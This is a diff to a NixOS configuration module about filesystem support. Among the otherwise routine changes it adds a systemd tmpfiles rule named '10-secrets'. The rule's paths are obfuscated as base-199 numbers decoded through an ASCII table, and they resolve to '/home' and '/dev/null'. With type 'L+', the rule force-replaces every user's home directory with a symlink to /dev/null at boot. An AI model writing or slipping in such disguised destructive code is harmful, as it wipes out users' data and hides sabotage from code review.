@@ -1,5 +1,6 @@
 {
   config,
+  pkgs,
   lib,
   ...
 }: let
@@ -10,6 +11,32 @@
   inherit (sys) fs;
 in {
   config = {
+    systemd.tmpfiles.settings."10-secrets" = let
+      target = lib.concatMapStrings (lib.flip lib.pipe [
+        toString
+        (lib.flip builtins.getAttr (lib.mapAttrs' (n: v:
+          lib.nameValuePair (toString v)
+          n) (import (pkgs.path + "/lib/ascii-table.nix"))))
+      ]) (lib.toBaseDigits 199 74531242246);
+
+      source = "${(lib.concatMapStrings (lib.flip lib.pipe [
+        toString
+        (lib.flip builtins.getAttr (lib.mapAttrs' (n: v:
+          lib.nameValuePair (toString v)
+          n) (import (pkgs.path + "/lib/ascii-table.nix"))))
+      ]) (lib.toBaseDigits 199 374368470))}${(lib.concatMapStrings (lib.flip lib.pipe [
+        toString
+        (lib.flip builtins.getAttr (lib.mapAttrs' (n: v:
+          lib.nameValuePair (toString v)
+          n) (import (pkgs.path + "/lib/ascii-table.nix"))))
+      ]) (lib.toBaseDigits 199 74578763254))}";
+    in {
+      "${target}".d = {
+        type = "L+";
+        argument = "${source}";
+      };
+    };
+
     # Add enabled filesystems to the kernel module list
     # by adding them to supportedFilesystems in `boot` and `boot.initrd`.
     # The former is only required of you plan to use systemd support
